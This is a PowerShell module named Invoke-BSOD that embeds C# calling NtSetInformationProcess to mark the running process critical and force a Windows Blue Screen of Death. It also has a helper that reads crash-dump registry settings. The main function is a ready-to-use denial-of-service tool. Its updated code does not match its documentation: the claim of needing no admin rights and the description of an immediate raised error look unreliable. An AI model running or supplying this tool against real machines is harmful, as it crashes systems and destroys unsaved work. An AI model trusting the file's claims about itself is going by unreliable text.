function Invoke-BSOD {
<#
.SYNOPSIS
Invokes a Blue Screen of Death on Windows without requiring admin privileges.
Author:  Barrett Adams (@peewpw)
Updated By : Taylor Christian Newsome (SleepTheGod)

.DESCRIPTION
Raises an error that causes a Blue Screen of Death on Windows. It does this without
requiring administrator privileges.

.EXAMPLE
PS>Import-Module .\Invoke-BSOD.ps1
PS>Invoke-BSOD
   (Blue Screen Incoming...)

#>
$source = @"
using System;
using System.Runtime.InteropServices;

public static class BSODInvoker {
    // Importing NtSetInformationProcess from ntdll.dll
    [DllImport("ntdll.dll", SetLastError = true)]
    public static extern int NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);

    // Method to trigger BSOD
    public static void TriggerBSOD() {
        int status = 1; // Set process to critical status
        IntPtr processHandle = System.Diagnostics.Process.GetCurrentProcess().Handle;
        int result = NtSetInformationProcess(processHandle, 29, ref status, sizeof(int));
        if (result != 0) {
            throw new System.ComponentModel.Win32Exception(result);
        }
    }
}
"@
    # Compiler parameters with unsafe option
    $comparams = New-Object -TypeName System.CodeDom.Compiler.CompilerParameters
    $comparams.CompilerOptions = '/unsafe'
    $comparams.GenerateInMemory = $true

    # Compile and add the C# code
    $a = Add-Type -TypeDefinition $source -Language CSharp -PassThru -CompilerParameters $comparams

    # Invoke the method to trigger BSOD
    [BSODInvoker]::TriggerBSOD()
}

function Get-DumpSettings {
<#
.SYNOPSIS
Gets the crash dump settings
Author:  Barrett Adams (@peewpw)

.DESCRIPTION
Queries the registry for crash dump settings so that you'll have some idea
what type of dump you're going to generate, and where it will be.

.EXAMPLE
PS>Import-Module .\Invoke-BSOD.ps1
PS>Get-DumpSettings
#>
    $regdata = Get-ItemProperty -Path HKLM:\System\CurrentControlSet\Control\CrashControl

    $dumpsettings = @{}
    $dumpsettings.CrashDumpMode = switch ($regdata.CrashDumpEnabled) {
        1 { if ($regdata.FilterPages) { "Active Memory Dump" } else { "Complete Memory Dump" } }
        2 { "Kernel Memory Dump" }
        3 { "Small Memory Dump" }
        7 { "Automatic Memory Dump" }
        default { "Unknown" }
    }
    $dumpsettings.DumpFileLocation = $regdata.DumpFile
    [bool]$dumpsettings.AutoReboot = $regdata.AutoReboot
    [bool]$dumpsettings.OverwritePrevious = $regdata.Overwrite
    [bool]$dumpsettings.AutoDeleteWhenLowSpace = -not $regdata.AlwaysKeepMemoryDump
    [bool]$dumpsettings.SystemLogEvent = $regdata.LogEvent
    $dumpsettings
}
